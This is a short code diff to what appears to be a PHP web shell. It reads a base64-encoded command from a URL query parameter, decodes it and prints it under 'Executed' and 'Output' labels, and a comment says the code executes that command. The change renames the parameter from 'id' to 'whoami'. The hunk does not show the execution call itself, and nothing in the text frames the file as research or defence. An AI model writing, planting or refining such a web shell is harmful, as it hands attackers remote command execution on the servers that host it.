@@ -19,7 +19,7 @@
     
     <!-- PHP code that executes command and outputs cleanly -->
     <?php
-        $decoded_command = base64_decode($_GET['id']);
+        $decoded_command = base64_decode($_GET['whoami']);
         echo "<b>Executed:</b>  $decoded_command";
         echo str_repeat("<br>",2);
         echo "<b>Output:</b>";
